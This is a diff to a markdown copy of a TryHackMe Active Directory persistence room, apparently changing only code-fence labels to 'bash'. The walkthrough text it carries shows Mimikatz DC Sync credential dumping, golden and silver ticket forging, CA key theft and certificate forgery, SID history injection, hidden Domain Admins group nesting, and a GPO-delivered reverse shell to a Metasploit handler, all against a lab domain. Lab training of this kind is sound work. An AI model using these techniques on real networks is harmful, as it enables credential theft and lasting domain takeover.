@@ -43,7 +43,7 @@ Connection to the Network
 If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the THMDC.za.tryhackme.loc host. **Note that the suffix for this network and the exploiting AD network is .loc and not .com.**  We do still need to configure DNS, however. Windows Networks use the Domain Name Service (DNS) to resolve hostnames to IPs. Throughout this network, DNS will be used for the tasks. You will have to configure DNS on the host on which you are running the VPN connection. In order to configure our DNS, run the following command:
 
   Terminal 
-```Terminal 
+```bash
 [thm@thm]$ sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
 ```
 
@@ -66,7 +66,7 @@ If you are going to use your own attack machine, an OpenVPN configuration file w
 Use an OpenVPN client to connect. This example is shown on a Linux machine; similar guides to connect using Windows or macOS can be found at your [access](https://tryhackme.com/r/access) page.
 
   Terminal 
-```Terminal 
+```bash
 [thm@thm]$ sudo openvpn persistingad.ovpn
 Fri Mar 11 15:06:20 2022 OpenVPN 2.4.9 x86_64-redhat-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 19 2020
 Fri Mar 11 15:06:20 2022 library versions: OpenSSL 1.1.1g FIPS  21 Apr 2020, LZO 2.08
@@ -172,7 +172,7 @@ DCSync All
 We will be using Mimikatz to harvest credentials. SSH into THMWRK1 using the DA account and load Mimikatz:
 
    Terminal  
-```Terminal 
+```bash
 Microsoft Windows [Version 10.0.17763.1098]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -191,7 +191,7 @@ mimikatz #
 Let's start by performing a DC Sync of a single account, our own:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
 [DC] 'za.tryhackme.loc' will be the domain
 [DC] 'THMDC.za.tryhackme.loc' will be the DC server 
@@ -229,7 +229,7 @@ You will see quite a bit of output, including the current NTLM hash of your acco
 This is great and all, but we want to DC sync every single account. To do this, we will have to enable logging on Mimikatz:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # log <username>_dcdump.txt 
 Using '<username>_dcdump.txt' for logfile: OK
 ```
@@ -237,7 +237,7 @@ Using '<username>_dcdump.txt' for logfile: OK
 Make sure to change <username> to your username as to not overwrite the logdump of other users. Now, instead of specifying our account, we will use the /all flag:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all
 ```
 
@@ -304,7 +304,7 @@ Forging Tickets for Fun and Profit
 Now that we have explained the basics for Golden and Silver Tickets, let's generate some. You will need the NTLM hash of the KRBTGT account, which you should now have due to the DC Sync performed in the previous task. Furthermore, make a note of the NTLM hash associated with the THMSERVER1 machine account since we will need this one for our silver ticket. You can find this information in the DC dump that you performed. The last piece of information we need is the Domain SID. Using our low-privileged SSH terminal on THMWRK1, we can use the AD-RSAT cmdlet to recover this information:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -345,7 +345,7 @@ UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc
 Now that we have all the required information, we can relaunch Mimikatz:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 
@@ -361,7 +361,7 @@ mimikatz #
 Once Mimikatz is loaded, perform the following to generate a golden ticket:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
 ```
 
@@ -379,14 +379,14 @@ Parameters explained:
 We can verify that the golden ticket is working by running the dir command against the domain controller:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmdc.za.tryhackme.loc\c$\
 ```
 
 Even if the golden ticket has an incredibly long time, the blue team can still defend against this by simply rotating the KRBTGT password twice. If we really want to dig in our roots, we want to generate silver tickets, which are less likely to be discovered and significantly harder to defend against since the passwords of every machine account must be rotated. We can use the following Mimikatz command to generate a silver ticket:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt
 ```
 
@@ -404,7 +404,7 @@ Parameters explained:
 We can verify that the silver ticket is working by running the dir command against THMSERVER1:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\Administrator.ZA>dir \\thmserver1.za.tryhackme.loc\c$\
 ```
 
@@ -457,7 +457,7 @@ Extracting the Private Key
 The private key of the CA is stored on the CA server itself. If the private key is not protected through hardware-based protection methods such as an Hardware Security Module (HSM), which is often the case for organisations that just use Active Directory Certificate Services (AD CS) for internal purposes, it is protected by the machine Data Protection API (DPAPI). This means we can use tools such as Mimikatz and SharpDPAPI to extract the CA certificate and thus the private key from the CA. Mimikatz is the simplest tool to use, but if you want to experience other tools, have a look [here](https://pentestlab.blog/2021/11/15/golden-certificate/). Use SSH to authenticate to THMDC.za.tryhackme.loc using the Administrator credentials from Task 2, create a unique directory for your user, move to it, and load Mimikatz:
 
    Terminal  
-```Terminal 
+```bash
 za\administrator@DC C:\Users\Administrator.ZA>mkdir <username> 
 za\administrator@DC C:\Users\Administrator.ZA>cd <username>
 za\administrator@DC C:\Users\Administrator.ZA\am0>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
@@ -475,7 +475,7 @@ mimikatz #
 Let's first see if we can view the certificates stored on the DC:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # crypto::certificates /systemstore:local_machine
  * System Store  : 'local_machine' (0x00020000)
  * Store         : 'My'
@@ -505,7 +505,7 @@ mimikatz # crypto::certificates /systemstore:local_machine
 We can see that there is a CA certificate on the DC. We can also note that some of these certificates were set not to allow us to export the key. Without this private key, we would not be able to generate new certificates. Luckily, Mimikatz allows us to patch memory to make these keys exportable:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -520,7 +520,7 @@ mimikatz # crypto::cng
 If you get an error, don't worry, it just means someone else executed the patch before you. With these services patched, we can use Mimikatz to export the certificates:
 
    Mimikatz Terminal  
-```Mimikatz Terminal 
+```bash
 mimikatz # crypto::certificates /systemstore:local_machine /export
  * System Store  : 'local_machine' (0x00020000)
  * Store         : 'My'
@@ -550,7 +550,7 @@ mimikatz # crypto::certificates /systemstore:local_machine /export
 The exported certificates will be stored in both PFX and DER format to disk:
 
    Terminal  
-```Terminal 
+```bash
 za\administrator@THMDC C:\Users\Administrator.ZA\am0>dir
  Volume in drive C is Windows
  Volume Serial Number is 1634-22A9
@@ -576,7 +576,7 @@ Generating our own Certificates
 Now that we have the private key and root CA certificate, we can use the SpectorOps [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to forge a Client Authenticate certificate for any user we want. The ForgeCert and Rubeus binaries are stored in the C:\Tools\ directory on THMWRK1. Let's use ForgeCert to generate a new certificate:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
 ```
 
@@ -610,7 +610,7 @@ Let's break down the parameters:
 Once we execute the command, we should receive our TGT:
 
     Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
           ______        _
          (_____ \      | |
@@ -674,7 +674,7 @@ Now we can use Mimikatz to load the TGT and authenticate to THMDC:
 
   Terminal
  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\aaron.jones>C:\Tools\mimikatz_trunk\x64\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
@@ -760,7 +760,7 @@ Forging History
 Get an SSH session on THMDC using the Administrator credentials for this next part. Before we forge SID history, let's just first get some information regarding the SIDs. Firstly, let's make sure that our low-privilege user does not currently have any information in their SID history:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMCHILDDC C:\Users\Administrator.ZA>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -784,7 +784,7 @@ UserPrincipalName :
 This confirms that our user does not currently have any SID History set. Let's get the SID of the Domain Admins group since this is the group we want to add to our SID History:
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA> Get-ADGroup "Domain Admins"
 
 DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc
@@ -800,7 +800,7 @@ SID               : S-1-5-21-3885271727-2693558621-2658995185-512
 We could use something like Mimikatz to add SID history. However, the latest version of Mimikatz has a flaw that does not allow it to patch LSASS to update SID history. Hence we need to use something else. In this case, we will use the [DSInternals](https://github.com/MichaelGrafnetter/DSInternals) tools to directly patch the ntds.dit file, the AD database where all information is stored:
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA>Stop-Service -Name ntds -force 
 PS C:\Users\Administrator.ZA> Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
 PS C:\Users\Administrator.ZA>Start-Service -Name ntds
@@ -811,7 +811,7 @@ The NTDS database is locked when the NTDS service is running. In order to patch 
 After these steps have been performed, let's SSH into THMWRK1 with our low-privileged credentials and verify that the SID history was added and that we now have Domain Admin privileges:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\aaron.jones>powershell
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved. 
@@ -907,14 +907,14 @@ Nesting Our Persistence
 Let's simulate this type of persistence. In order to allow other users also to perform the technique, make sure to prepend your username to all the groups that you create. In order to simulate the persistence, we will create some of our own groups. Let's start by creating a new base group that we will hide in the People->IT Organisational Unit (OU):
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
 ```
 
 Let's now create another group in the People->Sales OU and add our previous group as a member:
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA>New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
 PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
 ```
@@ -922,7 +922,7 @@ PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup2"
 We can do this a couple more times, every time adding the previous group as a member:
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
 PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"
 PS C:\Users\Administrator.ZA> New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
@@ -934,21 +934,21 @@ PS C:\Users\Administrator.ZA> Add-ADGroupMember -Identity "<username>_nestgroup5
 With the last group, let's now add that group to the Domain Admins group:
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
 ```
 
 Lastly, let's add our low-privileged AD user to the first group we created:
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
 ```
 
 Instantly, your low-privileged user should now have privileged access to THMDC. Let's verify this by using our SSH terminal on THMWRK1:
 
    Terminal  
-```Terminal 
+```bash
 za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\thmdc.za.tryhackme.loc\c$\ 
  Volume in drive \\thmdc.za.tryhackme.loc\c$ is Windows 
  Volume Serial Number is 1634-22A9
@@ -973,7 +973,7 @@ za\aaron.jones@THMWRK1 C:\Users\aaron.jones>dir \\thmdc.za.tryhackme.loc\c$\
 Let's also verify that even though we created multiple groups, the Domain Admins group only has one new member:
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Users\Administrator.ZA> Get-ADGroupMember -Identity "Domain Admins"
 
 distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc
@@ -1055,7 +1055,7 @@ SDProp
 Now we just need to wait 60 minutes, and our user will have full control over all Protected Groups. This is because the Security Descriptor Propagator (SDProp) service executes automatically every 60 minutes and will propagate this change to all Protected Groups. However, since we do not like to wait, let's kick off the process manually using Powershell. In the `C:\Tools\` directory, a script `Invoke-ADSDPropagation` is provided::
 
    Terminal  
-```Terminal 
+```bash
 PS C:\Tools> Import-Module .\Invoke-ADSDPropagation.ps1 
 PS C:\Tools> Invoke-ADSDPropagation
 ```
@@ -1128,7 +1128,7 @@ You will see that the script executes three commands chained together with `&&`.
 We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:
 
    Terminal  
-```Terminal 
+```bash
 $thm scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
 
 $thm scp am0_script.bat za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
@@ -1184,7 +1184,7 @@ In order to simulate this, let's reset the password for one of the Tier 1 admini
 Use your Tier 1 administrator credentials, RDP into one of the servers. If you give it another minute, you should get a callback on your multi-handler:
 
    Terminal  
-```Terminal 
+```bash
 msf5 exploit(multi/handler) > run 
 Started reverse TCP handler on 172.31.16.251:4445 
 
